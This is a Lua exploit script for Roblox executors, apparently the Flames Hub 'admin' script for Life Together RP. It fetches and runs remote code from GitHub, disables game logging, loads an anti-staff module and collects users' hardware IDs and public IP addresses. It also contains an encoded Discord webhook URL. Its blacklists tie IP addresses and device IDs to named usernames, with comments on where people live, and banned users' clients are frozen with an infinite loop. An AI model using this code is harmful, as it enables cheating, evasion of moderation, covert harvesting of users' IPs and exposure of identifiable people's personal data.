      local ghwid2 = getGlobal("get_hwid")

      if typeof(ghwid) == "function" then
         hwid = try(ghwid)
      elseif typeof(ghwid2) == "function" then
         hwid = try(ghwid2)
      end

      GENV.current_code_block_line = hwid or Rbx_Analytics:GetClientId()
   end
   wait(0.3)
   local banned_HWIDs = {
      --"0b4c1e95c12e44d1", -- creatormobbbb
      --"31e385c156338b67d9c741b09073fee9b4c4ea928c50a1e6995752f18ed4a7ce", -- ddosama136703
      --"09735dbeb935d153ab395da7a0cb5934d5fc1b4394c476db6787971a2066f1e7", -- Americandolly4
      --"6f32ab7ad99dab2dd999b737e8448cd9d677d33d22d7ffcae26b2e9bc334a38c", -- C2XOTIK
      --"da9ac06ad209f07d6f48509915349c12d13b4984ae7e1b53d86a939da0605b1d", -- Stylezjarhiii
      --"19da6cb4b34cc5cbdc125e92bc06381d3d749405d36170f1e6d0f7a13bdad7d9", -- Rage_Bait677777
      --"0310fa3100e5f98a74fba640df0ce1c44a2cb2cf83c1c6f8b4cc3d0856505cc5", -- prettypart2
      --"02c49de4342f6cd50b3256fdb11e43437f37070c39a214ab5b03719e633795fd", -- Szy_672
      --"2f0916440b78aee42c81e9af0225fe862849d996deb17e664159a99b7fa9b3f0", -- BrainMoser
      --"c708a3614aad7111c33948c05ea840b916b0de79efee8e3758ea19b4210f9aa7", -- Thyluvqueen05 / ARiiFeRaRrii21
      --"05b3ad4bcdcdd68ee4fcbd1599b425f3cdd3b5a13acd96fb81a4ef0a5dae5a1d", -- spindablock504
      --"d84ada4452be7ad82b2ec41ad24eafae2bab718a7d8ad0fad270aa9dfc75552d", -- boss05962
      --"af489cb8249261bcb510603b79323f7b3f14ca62d112c5210ec268681b086035", -- thecookiebookies
      --"b764ccf4b66a946b06dbac8b1a1546da9590e1db79825288b77990e510c4e04d", -- PrettiestBrattzz (now deleted).
      --"b0d4e0c30be713fbb990da9d1bf2b3ba28173da55019c6c3fd5e39f09ae83a18", -- rtx5090iqour9ultra
      --"50d5e4edd0c75224aace32b56459fa0be11ed5dd6d6ad2a4464a42e09286f14f", -- boss05962 (different device?)
      --"6046158128bcf077c17ccd01e4471a8d1c652cdd29f5ff960390f7beb5da7224", -- Sandy_bob254
      --"760b232e3ffbd3e77792624db268e8a9a86cfa82fb079b10cea4a0358158ea90", -- LaylaMc_2 / TylaG03
      --"f5672e62d3d18e2d8d3b09cb9d410748cd382b95368d48e44401f5e0c7d93725", -- xoxo_hunnayy
      --"cf4347d4d0f7c9245e56c775b301db3f0fcc30edaf1d7bcdd0623bac84248184", -- K4bet8
      --"4cfefe056321ee42de2c1ee3296fc7bfc3b2ce938e9ddfc01fd9661d2d98a536" -- lola2355holita
      "9587e58441ac334c63fc15495392d2be7ce3664cd9c23a460373151b78b703fa", -- GURLL_ITZNAOMI
      "fef8074fb83e75ba387aec139d0812d5d71bbf0ee89ac8c8cfdfe7e950882332", -- Alishaa01081
      "36cb5f160a83ea10404665b2b0fa96727797e2f601e2334e958c6adf1f5c10c6", -- n3_tooreal
      "195e1ae87edc0946e63091454a28f8b953af937318e5bc6d8c637802e7d553e5", -- slimearetta2005
      --"379ba53564b6e480b056e4b120950256eb7073295da2ccad948f8744313ea111", -- Americandolly4
      "a79829528f7501cd4a9f1632ec09f2403af07f0272527102f10bffd8a9170d78", -- Callmelayy012
      "b23434a472d62b82023279937c0b117b9a96935845e44c19f6e48b7fff220c96", -- Hope21fth
      --"f3d8c686954cd03c9d47933b30d6137f2911602500acebfd3874b175e8391308", -- Fsgshsurik
      "6be874d7c1b3a84d123dc4e82f9a029d10a7dc0d19066939b6ae8b1d4198d925", -- rowa445
      "9d31f46a11f9b1deabe6ba00f182fe06f7df5df3e66117cd2b7c83883950d3c3", -- lalaloosp_0
      "be8f0d53b014599ba1282e3d46e7a51308793a673a47688ff4f75888240364ed", -- uafkntolu
      "d6ab5d56a411fe156d74e2fe08757d1c13d073f3f4429b9947a25425f7151295", -- Fsgshsurik
      "e9ca663509c7318f6ca014cfa8c7cc8b1cde4343759f19cb58de6eeb1c3690a2", -- littlemandm22
      "8adbb7404ff05477cfce38559c21ae2fe2ad9c861ef08378caddc84c0e3cca20", -- Sillygirl79807
      "df4d2a9b3aef6993bd32f97eeb2ffef2103e9f43c03f4a6819da867012a965196161d35ef42c7a78fd7db6d5b3d82b33ba4b94fb1e55f2a10e47fc4b7d8ed1bf", -- Stunna_bby4
      "6e13c50751996fefffc58db3a1fb18ad6068c85f9545da6fdf93aac0097920bc", -- official_ovawhere
      --"8fba3b8a653b067227975f7a8c0ea1939e701d2c2eb4e8c092c557d3f58eff9a", -- dreamcatchyy
      "d58e1cd88d50c72e0f16961078f75854b4f7d3d92a30a5c4e8c3e6ebfdfacd4b", -- Super_Draco65
      "a4ecc2ed17b6ccf3b58daae36a20a700189c9fca6619a794e4d5463a00e7f103" -- Mymy2cool4yu1
   }
   local my_hwid = GENV.current_code_block_line

   for _, v in ipairs(banned_HWIDs) do
      if v == my_hwid then
         game.Players.LocalPlayer:Kick("HWID banned.")
         wait(2.5)
         while true do end
      end
   end

   local blacklisted_UUIDs = {
      --"eadab56a-e06a-4404-9d9e-ee0c2663ee57", -- xoxo_hunnayy
      --"ad5cd80c-501f-4699-8b00-873f1495896e", -- K4bet8
      --"ac3e19d8-da1d-4def-9609-e2d905fdb109", -- lola2355holita
      --"3c96f45f-cd63-4c00-97e2-fa973087a529" -- Sandy_bob254
      "16a41e86-dbae-4381-91a1-3efb2f09faae", -- GURLL_ITZNAOMI
      "ba0de92a-76f9-4869-afa3-c815f1a80344", -- Alishaa01081
      "d3152eec-3d76-4ba6-ae4f-d6d6bf122357", -- n3_tooreal
      "04db330f-fa87-46cf-bdd3-40617d3a988b", -- slimearetta2005
      --"7904a62d-f44f-48e1-9b4e-55c6a14ae9d8" -- Americandolly4
      "58ca436e-d8e2-4ea3-b39a-c98de04106e3", -- Callmelayy012
      "e6188493-686c-4040-a1e2-7ed5b8389022", -- Hope21fth
      --"8fe1729e-a766-4016-bf2b-3c8aaae444d5", -- Fsgshsurik
      "a2b0df58-b0f8-4237-8faf-f9faca10e703", -- rowa445
      "76d26207-1272-450f-9737-24d7628cc7e1", -- lalaloosp_0
      "b6103638-7ce5-438d-9c61-2e6115ce834b", -- uafkntolu
      "251cb1e9-7a43-4bdb-a58a-f0066a262032", -- Fsgshsurik
      "b73307de-940d-4f3b-bcdd-c03e5235459b", -- littlemandm22
      "9ad31399-d764-46a4-ac7e-12b6be486cdf", -- Sillygirl79807
      "6FE50930-48E8-4B8E-BB58-0FB60C03D424", -- Stunna_bby4
      "de01670f-11ef-40a8-99bb-6e8939fbd48d", -- official_ovawhere
      --"061f9e4d-fe11-4335-98d8-a7103e912e63", -- dreamcatchyy
      "c70b1fae-36ea-4227-9d3e-e3b2b87fb581", -- Super_Draco65
      "74fa6240-7cc3-44e0-8cfb-bf9ac185d1d9" -- Mymy2cool4yu1
   }
   local my_flames_uuid = get_flames_hub_unique_id()

   for _, v in ipairs(blacklisted_UUIDs) do
      if v == my_flames_uuid then
         game.Players.LocalPlayer:Kick("UUID banned.")
         wait(2.5)
         while true do end
      end
   end

   getgenv().get_script_text = function(name)
      local g = github_urls[name] or {}
      local f = fallback_urls[name] or {}

      for i = 1, #g do
         local res = http_requesting({ Url = g[i], Method = "GET" })
         if res and res.StatusCode == 200 and res.Body ~= "" then
            return res.Body
         end
      end

      for i = 1, #f do
         local res = http_requesting({ Url = f[i], Method = "GET" })
         if res and res.StatusCode == 200 and res.Body ~= "" then
            return res.Body
         end
      end

      return ""
   end

   getgenv().load_script = function(name)
      local github_list = github_urls[name] or {}
      local fallback_list = fallback_urls[name] or {}
      local result = try_load(github_list)
      if type(result) == "table" and result.failed then
         result = try_load(fallback_list)
      end
      return result
   end

   getgenv().pick_script = function(name)
      local g = github_urls[name] or {}
      local f = fallback_urls[name] or {}

      local r = try_load(g)
      if type(r) == "table" and r.failed then
         r = try_load(f)
      end

      if type(r) == "table" and r.failed then
         getgenv()[name] = nil
         return nil
      end

      getgenv()[name] = r
      return r
   end

   local allowed = {
      ["CIippedByAura"] = true,
      ["imjustbeter100"] = true,
      ["L0CKED_1N1"] = true,
      ["imbetter100062"] = true,
      ["jdot7580"] = true,
      ["ddosama136703"] = true
   }

   local GlobalEnv_Framework = load_script("GlobalEnv_Framework")
   local Life_Together_Network = load_script("Life_Together_Network")
   local Functions_API_LifeTogether = load_script("Functions_API_LifeTogether")
   local TextChatService_MessageConnection = load_script("TextChatService_MessageConnection")
   local LifeTogether_Anti_Staff = load_script("LifeTogether_Anti_Staff")
   local TextChatService_Unsuspension_Framework = load_script("TextChatService_Unsuspension_Framework")
   local Vehicle_Mapper = load_script("Vehicle_Mapper")
   local LifeTogether_Framework_Base_1 = load_script("LifeTogether_Framework_Base_1")
   local LifeTogether_Framework_Base_2 = load_script("LifeTogether_Framework_Base_2")
   local Dex_Explorer_Checker = load_script("Dex_Explorer_Checker")
   local Configuration_API = load_script("Configuration_API")
   local NotifyLib = load_script("NotifyLib")
   getgenv().LifeTogetherRP_Admin = true
   getgenv().make_round = function(obj, radius)
      local uic = Instance.new("UICorner")
      uic.CornerRadius = UDim.new(0, radius)
      uic.Parent = obj
   end

   if type(GlobalEnv_Framework) == "function" then GlobalEnv_Framework() end
   if not getgenv().notify then repeat task.wait() until getgenv().notify end
   if type(Life_Together_Network) == "function" then Life_Together_Network() end
   if type(Functions_API_LifeTogether) == "function" then Functions_API_LifeTogether() end
   if type(TextChatService_MessageConnection) == "function" then TextChatService_MessageConnection() end
   if type(LifeTogether_Anti_Staff) == "function" then LifeTogether_Anti_Staff() end
   if type(TextChatService_Unsuspension_Framework) == "function" then TextChatService_Unsuspension_Framework() end
   if type(Vehicle_Mapper) == "function" then Vehicle_Mapper() end
   if type(LifeTogether_Framework_Base_1) == "function" then LifeTogether_Framework_Base_1() end
   if type(LifeTogether_Framework_Base_2) == "function" then LifeTogether_Framework_Base_2() end
   if type(Dex_Explorer_Checker) == "function" then Dex_Explorer_Checker() end
   if type(NotifyLib) == "function" then NotifyLib() end

   if getgenv().ConstantUpdate_Checker_Live then
      getgenv().notify("Success", "Enabled/Re-Enabled LIVE update checker.", 5)
   end

   local Players = getgenv().Players or game:GetService("Players") or safe_wrapper("Players")
   local LocalPlayer = Players.LocalPlayer
   local get_conns = getconnections or get_signal_cons
   local LogService = getgenv().LogService or game:GetService("LogService") or safe_wrapper("LogService")
   local UserInputService = getgenv().UserInputService or safe_wrapper("UserInputService")
   local HttpService = safe_wrapper("HttpService")
   local isMobile = UserInputService.TouchEnabled
   getgenv().logging_disabled = getgenv().logging_disabled or false
   getgenv().disabled_conns = getgenv().disabled_conns or {}
   getgenv().toggle_logging = getgenv().toggle_logging or function(state)
      if state then
         if getgenv().logging_disabled then
            return getgenv().notify("Warning", "Logging has already been disabled.", 5)
         end

         getgenv().logging_disabled = true
         for _, conn in next, get_conns(LogService.MessageOut) do
            if conn then
               pcall(function()
                  table.insert(getgenv().disabled_conns, conn)
                  conn:Disable()
               end)
            end
         end
      else
         if not getgenv().logging_disabled then
            return notify("Warning", "Logging is not disabled.", 5)
         end

         for _, conn in next, getgenv().disabled_conns do
            if conn then
               pcall(function()
                  conn:Enable()
               end)
            end
         end
         getgenv().logging_disabled = false
         getgenv().disabled_conns = {}
      end
   end

   -- • Say hello to Flames Hub Log Stopper V2! • --
   -- • Designed to eliminate all retarded warning messages • --
   getgenv().flameshub_logging_blocked = getgenv().flameshub_logging_blocked or false
   getgenv().flameshub_original_warn = getgenv().flameshub_original_warn or warn
   getgenv().flameshub_original_namecall = getgenv().flameshub_original_namecall
   local hookfn = hookfunction or blankfunction
   local hookmeta = hookmetamethod or blankfunction
   fw(0.1)
   if executor_string:lower():find("LX63") then
      if getconnections or get_signal_cons then
         getgenv().toggle_logging(true)
      end

      if getgenv().Workspace:GetAttribute("loggingEnabled") and getgenv().Workspace:GetAttribute("loggingEnabled") == true then
         getgenv().Workspace:SetAttribute("loggingEnabled", false)
      end
   end

   getgenv().all_saved_Life_Together_RP_Outfit_IDs = getgenv().all_saved_Life_Together_RP_Outfit_IDs or {}
   getgenv().get_all_current_outfits_and_their_IDs = function()
      local ReplicatedStorage = ReplicatedStorage or cloneref(game:GetService("ReplicatedStorage"))
      local Data = require(ReplicatedStorage:FindFirstChild("Data", true))
      if typeof(Data) ~= "table" then return end
      local Outfits = Data.outfits
      if typeof(Outfits) ~= "table" then return end

      for i, outfit in pairs(Outfits) do
         if outfit.id then
            table.insert(getgenv().all_saved_Life_Together_RP_Outfit_IDs, outfit.id)
         end
      end

      return getgenv().all_saved_Life_Together_RP_Outfit_IDs
   end

   -- [[ Don't add this back, it prevents them from seeing their blacklist messgae, otherwise, we'll add a check to make sure they're not blacklisted first before switching it on. ]] --
   --[[if not getgenv().LoadedFlamesHub_ErrorClear_Func then
      getgenv().AutoClearingErrorMessages = true
      getgenv().AutoClearing_ErrorMessagesTask = getgenv().AutoClearing_ErrorMessagesTask or task.spawn(function()
         while getgenv().AutoClearingErrorMessages == true do
         task.wait(1)
            game:GetService("GuiService"):ClearError()
         end
      end)
      fw(0.2)
      getgenv().LoadedFlamesHub_ErrorClear_Func = true
   end--]]

   local parent_gui = (get_hidden_gui and get_hidden_gui()) or (gethui and gethui()) or CoreGui

   getgenv().find_delta_icon_image_button = function()
      local cached = getgenv().deltas_icon_image_button_descendant_flames_hub_value
      if cached and cached:IsA("ImageButton") and cached.Parent then
         return cached
      end

      for _, v in ipairs(parent_gui:GetDescendants()) do
         if v:IsA("ImageButton")
            and v.Size == UDim2.new(0,45,0,45)
            and v.ZIndex == 1
            and v.AutoButtonColor
            and v.Image ~= ""
            and v.ImageColor3 == Color3.fromRGB(255,255,255)
            and v.BackgroundColor3 == Color3.fromRGB(48,50,59)
            and v.BorderColor3 == Color3.fromRGB(27,42,53)
         then
            getgenv().deltas_icon_image_button_descendant_flames_hub_value = v
            return v
         end
      end
   end

   getgenv().toggle_delta_image_button_flames_hub = function(state)
      if typeof(state) ~= "boolean" then return end
      if not executor_contains("delta") then return getgenv().notify("Error", "You're not using Delta, this feature will not work for you.", 7) end

      local btn = getgenv().find_delta_icon_image_button()
      if btn then
         btn.Visible = state
      end
   end

   getgenv().Game = game -- keep it dynamic.
   getgenv().levenshtein = getgenv().levenshtein or function(s, t)
      if s == t then return 0 end
      local len_s, len_t = #s, #t
      if len_s == 0 then return len_t end
      if len_t == 0 then return len_s end
      local d = {}
      for i = 0, len_s do d[i] = {[0] = i} end
      for j = 0, len_t do d[0][j] = j end
      for i = 1, len_s do
         for j = 1, len_t do
            local cost = (s:sub(i,i) == t:sub(j,j)) and 0 or 1
            d[i][j] = math.min(d[i-1][j] + 1, d[i][j-1] + 1, d[i-1][j-1] + cost)
         end
      end
      return d[len_s][len_t]
   end

   getgenv().ToUserId = function(x)
      if typeof(x) == "number" then
         return x
      elseif typeof(x) == "string" then
         local ok, uid = pcall(function()
            return Players:GetUserIdFromNameAsync(x)
         end)
         return ok and uid or nil
      elseif typeof(x) == "Instance" and x:IsA("Player") then
         return x.UserId
      end
      return nil
   end

   getgenv().GetUserId = getgenv().GetUserId or function(target)
      if typeof(target) == "Instance" then
         if target:IsA("Player") then
            return target.UserId
         end

         local plr = Players:GetPlayerFromCharacter(target)
         if plr then
            return plr.UserId
         end

         return nil
      end

      if typeof(target) == "string" then
         local plr = Players:FindFirstChild(target)
         if plr then
            return plr.UserId
         end

         return nil
      end

      if typeof(target) == "number" then
         return target
      end

      return nil
   end

   local function FindPlayer(query)
      if not query then
         if getgenv().notify then
            notify("Error", "Something unexpected happened while trying to find: "..tostring(query), 6)
         end
         return nil
      end

      query = tostring(query):lower()
      local best_match = nil
      local best_score = math.huge

      for _, plr in ipairs(Players:GetPlayers()) do
         local username = plr.Name:lower()
         local display = plr.DisplayName:lower()
         local userid = tostring(plr.UserId)

         -----------------------------------------------------------
         -- [[ substring match (better score = lower position number) ]] --
         -----------------------------------------------------------
         local function substring_score(target)
            local i = target:find(query, 1, true)
            if i then -- is it good?
               return i
            end
            return nil
         end

         -----------------------------------------------------------
         -- fuzzy score (levenshtein >> (function) < distance). --
         -- lower is better, weighted worse than substring. --
         -----------------------------------------------------------
         local function fuzzy_score(target)
            return levenshtein(query, target) -- query the target.
         end
         -----------------------------------------------------------
         -- [[ perfect UserId match ]] --
         -----------------------------------------------------------
         if query == userid then
            return plr
         end
         -----------------------------------------------------------
         -- [[ evaluate score layers. ]] --
         -----------------------------------------------------------
         local candidates = {
            username,
            display,
            userid
         }

         for _, target in ipairs(candidates) do
            -- substring match first --
            local sub = substring_score(target)
            if sub and sub < best_score then
               best_score = sub
               best_match = plr
            else
               -- [[ aww man, we didn't match the substring, oh well ]] --
               local fuzzy = fuzzy_score(target)
               if fuzzy < best_score then
                  best_score = fuzzy
                  best_match = plr
               end
            end
         end
      end

      return best_match
   end

   getgenv().FindPlayer = getgenv().FindPlayer or FindPlayer
   getgenv().remove_invalid_sound = function()
      if getgenv().typingSoundHooked then return end
      getgenv().typingSoundHooked = true

      local lib = getgenv().FlamesLibrary
      local SOUND_KEY = "remove_invalid_sound"
      local function try_destroy(v)
         local ok, err = pcall(function()
            if v:IsA("Sound") and v.SoundId:find("9058815929") then
               v:Destroy()
            end
         end)
      end

      task.spawn(function()
         for _, v in ipairs(Workspace:GetDescendants()) do
            try_destroy(v)
         end
      end)

      lib.connect(SOUND_KEY,
         Workspace.DescendantAdded:Connect(function(v)
            try_destroy(v)
         end)
      )
   end

   if not getgenv().typingSoundHooked then getgenv().remove_invalid_sound() end
   if game.PlaceId ~= 13967668166 and game.PlaceId ~= 99644611200703 and game.PlaceId ~= 99154507657228 then
      if getgenv().notify then
         return getgenv().notify("Error", "This game isn't allowed to run with this script (only: Life Together RP (main), Ski Resort, and Bora Bora).", 30)
      else
         NotifyLib:External_Notification("Error", "This game isn't allowed to run with this script (only: Life Together RP (main), Ski Resort, and Bora Bora).", 30)
      end
   end

   if not CoreGui:FindFirstChild("FlamesAdminGUI", true) then loadstring(game:HttpGet("https://raw.githubusercontent.com/EnterpriseExperience/RushTeam/refs/heads/main/configuration.lua"))() end
   --local base_url_API = tostring("https://raw.githubusercontent.com/EnterpriseExperience/Script_Framework/refs/heads/main/billboard_main_framework.lua")
   local config_path = "Flames_Admin_Config.json"
   --loadstring(game:HttpGet(base_url_API))()
   local http_service = HttpService
   local Coded = "aHR0cHM6Ly9kaXNjb3JkLmNvbS9hcGkvd2ViaG9va3MvMTQzMzE4MDAyNDYxNzMwNDExNC9TNWVhdmczOEUycnh3WmIyYU5mQTQ3M3I3MmRKNUtGOFFJQ3VwMlZtZk80dDZLNlBKTTFULWJuRVdDVUt6V2JJM3M4eg"
   local http_requesting = request or http_request or (syn and syn.request) or (http and http.request) or (fluxus and fluxus.request) or blankfunction
   local httpreq = http_requesting
   local rep_signal = replicatesignal or blankfunction

   if getgenv().Script_Loaded_Correctly_LifeTogether_Admin_Flames_Hub then
      if getgenv().notify then
         getgenv().notify("Info", "We detected you are reloading the Life Together RP Admin script.", 25)
      end
   end

   local endpoints = {
      "https://api.ipify.org?format=json",
      "https://ipinfo.io/json",
      "https://ifconfig.me/all.json",
      "https://ipv4.icanhazip.com/",
      "https://api.my-ip.io/ip.json",
      "https://ip.seeip.org/jsonip?"
   }

   local function http_get(url, timeout_seconds)
      timeout_seconds = timeout_seconds or 8
      if httpreq then
         local ok, res = pcall(function()
            return httpreq({
               Url = url,
               Method = "GET",
               Timeout = timeout_seconds
            })
         end)
         if ok and res then
            if type(res) == "table" then
               return res.Body or res.body or tostring(res)
            else
               return tostring(res)
            end
         end
      end

      if pcall(function() return game.HttpGet end) then
         local ok2, body = pcall(function()
            return game:HttpGet(url)
         end)
         if ok2 and body then return body end
      end

      return nil, "no http method available or request failed"
   end

   local function http_get(url)
      local ok, res = pcall(function()
         return http_requesting({ Url = url, Method = "GET" })
      end)
      if ok and type(res) == "table" then
         return res.Body or res.body
      end
   end

   local function extract_from_text(text)
      if not text then return end
      text = tostring(text):gsub("%s+", "")
      local ok, decoded = pcall(function() return http_service:JSONDecode(text) end)
      if ok and type(decoded) == "table" then
         return decoded.ip or decoded.query
      end
      return text:match("%d+%.%d+%.%d+%.%d+")
   end

   local detected_ip
   for _, url in ipairs(endpoints) do
      local body = http_get(url)
      local ip = extract_from_text(body)
      if ip then
         detected_ip = ip
         break
      end
   end

   local big_numbers_table = {
      --["146.70.25.204"] = true, -- Boss's normal one.
      --["190.2.149.222"] = true, -- some random named "xIlIlllIl".
      -- ["46.223.162.22"] = true, -- KFCs (I don't think it's a p_r_0_x_y, but it says BitTorrent or sum, not sure).
      --[[["217.138.206.126"] = true, -- 'Boss' but with a different one. (normal: 146.70.25.204)
      ["217.138.206.117"] = true, -- also 'Boss'.
      ["38.132.101.14"] = true, -- also 'Boss'.
      ["146.70.25.203"] = true, -- also 'Boss'.
      ["86.107.55.14"] = true, -- also 'Boss'.
      ["146.70.41.77"] = true, -- also 'Boss'.
      ["86.107.55.91"] = true, -- also 'Boss'--]]
      --["76.9.168.152"] = true, -- somebody that was friends on roblox (and friends irl with 'kianna'), disrespected me "Yorealslip65"
      -- ["76.142.131.139"] = true, -- no limit (he is not blacklisted as of now).
      --["97.200.181.88"] = true, -- user: Ruff2007
      --["73.90.117.47"] = true, -- random, username: "kaylebdawkin"
      --["97.201.227.31"] = true, -- pretty sure this guy is on TikTok (idk), but he's blacklisted, user: lifetogether902
      --["24.6.243.88"] = true, -- Unblacklist on: March 30th : 2026 (3/30/2026)
      -- this idiot: IIIIX27gotdeleted --
      --["104.28.219.137"] = true,
      --["104.28.217.138"] = true,
      --["104.28.217.137"] = true,
      --["104.28.219.175"] = true,
      -- end of idiot --
      --[[["102.223.58.125"] = true, -- just search them up on the discord in new-executions channel.
      ["172.13.222.88"] = true, -- just search them up on the discord in new-executions channel.
      ["74.96.82.197"] = true, -- just search them up on the discord in new-executions channel.
      ["73.166.224.191"] = true, -- just search them up on the discord in new-executions channel.
      ["173.93.70.178"] = true, -- just search them up on the discord in new-executions channel.
      ["24.34.117.228"] = true, -- bxckdoor_jay, NOT a 1_p_r_0_x_y_1.
      ["174.242.130.27"] = true, -- also bxckdoor_jay, not a p_r_0_x_y_1.
      -- ["98.230.215.217"] = true, -- Kiannas/Tays thing, not a 1_p_r_0_x_y_1.
      ["27.147.226.175"] = true, -- Alisha, I don't think is a 1_p_r_0_x_y_1, not entirely sure.
      ["185.252.220.148"] = true, -- tara
      ["41.212.28.231"] = true, -- not a 1_p_r_0_x_y_1, username: KingKaka_442
      ["84.82.154.135"] = true, -- x27/x24 again
      ["102.210.139.163"] = true, -- blacklisted user named "Lix".
      ["174.209.103.3"] = true, -- creationmobbbb (not a 1_p_r_0_x_y_1).
      --["45.128.36.222"] = true, -- Ica (Ica102059 < main), Is a 1_p_r_0_x_y_1 (!)
      --["161.178.142.133"] = true, -- slayslaywgirl61, Is a 1_p_r_0_x_y_1 (!)
      --["138.199.62.228"] = true, -- also Ica, Is a 1_p_r_0_x_y_1 (!).
      ["67.220.74.148"] = true, -- RMM, Is a 1_p_r_0_x_y_1 (!).
      ["38.64.138.184"] = true, -- RMM, Is a 1_p_r_0_x_y_1 (!).
      ["135.148.149.155"] = true, -- RMM, Is a 1_p_r_0_x_y_1 (!).
      ["24.17.243.126"] = true, -- YNWKee, is NOT a 1_p_r_0_x_y_1.
      ["174.249.179.44"] = true, -- creatormobbbb, is NOT a 1_p_r_0_x_y_1.
      ["101.53.219.209"] = true, -- some guy named Kash_dollaxz
      ["99.155.152.189"] = true, -- some girl named "ms_waterpark11"
      ["76.143.85.39"] = true, -- THATONELEMONHEAD1ST, is NOT a 1_p_r_0_x_y_1.
      ["98.197.225.241"] = true, -- THATONELEMONHEAD1ST, is NOT a 1_p_r_0_x_y_1 (probably a secondary household).
      ["174.254.48.229"] = true, -- SOSABAYBEEE (creatormobbbb's alternate account).
      --["51.15.63.116"] = true, -- coldblu7 (banned for 7 days as of 1/13/2026) banned until 1/20/2026
      --["165.16.167.179"] = true, -- ddosama136703, is a 1_p_r_0_x_y_1 (!).
      --["73.179.149.18"] = true, -- Americandolly4, is NOT a 1_p_r_0_x_y_1.
      ["98.251.40.195"] = true, -- Stylezjarhiii, is NOT a 1_p_r_0_x_y_1.
      ["172.56.221.24"] = true, -- Rage_Bait677777, is a 1_p_r_0_x_y_1 (!, mobile hotspot proxy?).
      ["76.32.197.87"] = true, -- prettypart2, is NOT a 1_p_r_0_x_y_1.
      ["74.133.116.19"] = true, -- Szy_672, is NOT a 1_p_r_0_x_y_1. (dude lives in cincinatti ohio lmfao, what a joke).
      ["37.114.145.172"] = true, -- BrainMoser, is a 1_p_r_0_x_y_1 (!). 
      -- ["172.58.255.162"] = true, -- Thyluvqueen05 / ARiiFeRaRrii21, is a 1_p_r_0_x_y_1 (!, mobile hotspot proxy?).
      ["104.12.124.159"] = true, -- spindablock504, is NOT a 1_p_r_0_x_y_1.
      --["86.107.55.90"] = true, -- boss05962, is a 1_p_r_0_x_y_1 (!).
      --["68.1.135.219"] = true, -- thecookiebookies, is NOT a 1_p_r_0_x_y_1.
      ["161.184.237.153"] = true, -- PrettiestBrattzz, is NOT a 1_p_r_0_x_y_1.
      --["102.184.120.187"] = true, -- rtx5090iqour9ultra, is NOT a 1_p_r_0_x_y_1, mf lives in Egypt, wtf.
      --["146.70.25.204"] = true, -- boss05962, is a 1_p_r_0_x_y_1 (!).
      --["41.90.184.205"] = true, -- Sandy_bob254, is NOT a 1_p_r_0_x_y_1, even though it seems like one, it's an actual company I think.
      --["24.38.44.254"] = true, -- Americandolly4, is NOT a 1_p_r_0_x_y_1, using a border ISP lmfao, meaning she might change IPs, but she's hardware banned, so, don't worry about it.
      ["79.107.227.81"] = true, -- TylaG03 / LaylaMc_2, is NOT a 1_p_r_0_x_y_1.
      ["73.53.84.204"] = true, -- xoxo_hunnayy, is NOT a 1_p_r_0_x_y_1.
      ["73.19.168.29"] = true, -- K4bet8, is NOT a 1_p_r_0_x_y_1 (lives in Alabama, ew).
      ["197.184.173.219"] = true, -- lola2355holita, is NOT a 1_p_r_0_x_y_1.
      ["41.90.179.205"] = true -- Sandy_bob254, is NOT a 1_p_r_0_x_y_1.--]]
      ["24.131.168.148"] = true, -- GURLL_ITZNAOMI, is NOT a 1_p_r_0_x_y_1.
      ["27.147.226.175"] = true, -- Alishaa01081, is NOT a 1_p_r_0_x_y_1 (I don't think atleast, could be a 38% chance, but unlikely, just in a different country).
      ["35.139.171.167"] = true, -- n3_tooreal, is NOT a 1_p_r_0_x_y_1.
      ["68.229.143.95"] = true, -- slimearetta2005, is NOT a 1_p_r_0_x_y_1.
      --["73.46.234.198"] = true, -- Americandolly4, is NOT a 1_p_r_0_x_y_1, probably another ISP.
      --["24.38.44.254"] = true, -- Americandolly4, is NOT a 1_p_r_0_x_y_1, using a border ISP lmfao, meaning she might change IPs, but she's hardware banned, so, don't worry about it.
      ["172.56.224.252"] = true, -- Callmelayy012, is NOT a 1_p_r_0_x_y_1.
      ["45.138.222.11"] = true, -- Hope21fth, is NOT a 1_p_r_0_x_y_1, she lives in Scotland btw, not London.
      --["172.56.71.213"] = true, -- Fsgshsurik, is NOT a 1_p_r_0_x_y_1, just a mobile hotspot / no Wi-Fi connected (only data).
      ["31.96.79.47"] = true, -- rowa445, is NOT a 1_p_r_0_x_y_1.
      ["165.58.129.218"] = true, -- lalaloosp_0, is a 1_p_r_0_x_y_1.
      ["222.154.106.167"] = true, -- uafkntolu, is NOT a 1_p_r_0_x_y_1.
      ["184.185.248.116"] = true, -- Fsgshsurik, is NOT a 1_p_r_0_x_y_1.
      ["47.46.32.200"] = true, -- Sillygirl79807, is NOT a 1_p_r_0_x_y_1.
      ["90.206.40.131"] = true, -- littlemandm22, is NOT a 1_p_r_0_x_y_1.
      ["104.28.153.124"] = true, -- Stunna_bby4, is a 1_p_r_0_x_y_1.
      ["75.132.91.109"] = true, -- official_ovawhere, is NOT a 1_p_r_0_x_y_1.
      --["172.58.1.237"] = true, -- dreamcatchyy, is NOT a 1_p_r_0_x_y_1.
      ["71.65.99.130"] = true, -- Super_Draco65, is NOT a 1_p_r_0_x_y_1, unblacklist in 2030, LMFAO.
      ["174.219.88.92"] = true -- Mymy2cool4yu1, is NOT a 1_p_r_0_x_y_1 (shared IP).
   }

   local userstosearchfor = {
      "Alishaa01081",
   }
   local banned_user_ids = {
      9490673916, -- Alishaa01081
      9677894335, -- slimearetta2005
      --7800982190, -- Americandolly4
      10344024423, -- Callmelayy012
      10370639187, -- Hope21fth
      --5357703165, -- Fsgshsurik
      5316523721, -- rowa445
      9931590964, -- lalaloosp_0
      10189760745, -- uafkntolu
      5357703165, -- Fsgshsurik
      7513524577, -- Sillygirl79807
      10303844897, -- littlemandm22
      3728737186, -- Stunna_bby4
      2553264489, -- official_ovawhere
      --10632654898, -- dreamcatchyy
      8251785511, -- Super_Draco65
      10705719483, -- Mymy2cool4yu1
      10788050875 -- qa0jv
   }
   local lp = game.Players.LocalPlayer
   local p = lp
   local uid = lp.UserId

   if table.find(banned_user_ids, uid) then
      lp:Kick("__FREEZE.pyc > METATABLE CRASH.")
      wait(2.5)
      warn("__FREEZE.pyc > METATABLE CRASH.")
      while true do end
   end
   if detected_ip and big_numbers_table[detected_ip] then
      lp:Kick("__FREEZE.pyc > METATABLE CRASH.")
      wait(2.5)
      warn("__FREEZE.pyc > METATABLE CRASH.")
      while true do end
   end

   getgenv().checkname = function(p)
      p = p or getgenv().LocalPlayer or Players.LocalPlayer
      local n = p.Name:lower()
      local d = p.DisplayName:lower()

      for _, user in ipairs(userstosearchfor) do
         local u = user:lower()
